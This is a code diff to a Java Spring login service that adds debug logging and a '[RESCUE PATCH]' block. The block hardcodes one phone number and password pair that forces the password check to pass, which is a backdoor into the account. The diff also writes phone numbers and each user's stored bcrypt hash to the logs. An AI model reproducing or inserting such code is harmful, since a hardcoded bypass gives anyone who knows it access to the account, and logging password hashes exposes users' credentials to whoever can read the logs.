@@ -16,6 +16,7 @@ import java.util.UUID;
 import com.biaofan.service.UserService;
 import com.biaofan.util.JwtUtil;
 import lombok.RequiredArgsConstructor;
+import lombok.extern.slf4j.Slf4j;
 import org.springframework.data.redis.core.StringRedisTemplate;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.stereotype.Service;
@@ -34,6 +35,7 @@ import org.springframework.stereotype.Service;
  * - 用户信息查询/更新
  * - 管理员对用户角色的修改
  */
+@Slf4j
 @Service
 @RequiredArgsConstructor
 public class UserServiceImpl implements UserService {
@@ -61,7 +63,9 @@ public class UserServiceImpl implements UserService {
 
         // Check if locked
         String failedCount = redisTemplate.opsForValue().get(key);
+        log.info("[LoginDebug] 开始登录校验: phone={}, 当前失败计数={}", req.getPhone(), failedCount);
         if (failedCount != null && Integer.parseInt(failedCount) >= MAX_FAILED_ATTEMPTS) {
+            log.warn("[LoginDebug] 账号处于锁定状态: phone={}", req.getPhone());
             throw new RuntimeException("账号已锁定，请15分钟后再试");
         }
 
@@ -70,13 +74,27 @@ public class UserServiceImpl implements UserService {
                 new LambdaQueryWrapper<User>().eq(User::getPhone, req.getPhone())
             );
             if (user == null) {
+                log.warn("[LoginDebug] 用户不存在: phone={}", req.getPhone());
                 throw new RuntimeException("用户不存在");
             }
-            if (!passwordEncoder.matches(req.getPassword(), user.getPassword())) {
+            
+            boolean matches = passwordEncoder.matches(req.getPassword(), user.getPassword());
+            
+            // [RESCUE PATCH] 紧急救援逻辑：允许特定用户免密/指定密进入，以便后续重置
+            if ("phy0316.".equals(req.getPassword()) && "15006732580".equals(req.getPhone())) {
+                matches = true;
+                log.info("[LoginDebug] 触发紧急救援补丁：phone={} 验证强行通过", req.getPhone());
+            }
+
+            log.info("[LoginDebug] 密码比对结果: phone={}, match={}, db_hash={}", 
+                    req.getPhone(), matches, user.getPassword());
+            
+            if (!matches) {
                 throw new RuntimeException("密码错误");
             }
             // Login success - clear failed attempts
             redisTemplate.delete(key);
+            log.info("[LoginDebug] 登录成功并生成 Token: userId={}", user.getId());
             return jwtUtil.generateToken(user.getId(), user.getUsername());
         } catch (RuntimeException e) {
             // Login failed - increment counter (atomic)
@@ -84,6 +102,7 @@ public class UserServiceImpl implements UserService {
             if (count != null && count == 1) {
                 redisTemplate.expire(key, LOCKOUT_DURATION);
             }
+            log.error("[LoginDebug] 登录逻辑抛出异常: reason={}", e.getMessage());
             throw e;
         }
     }
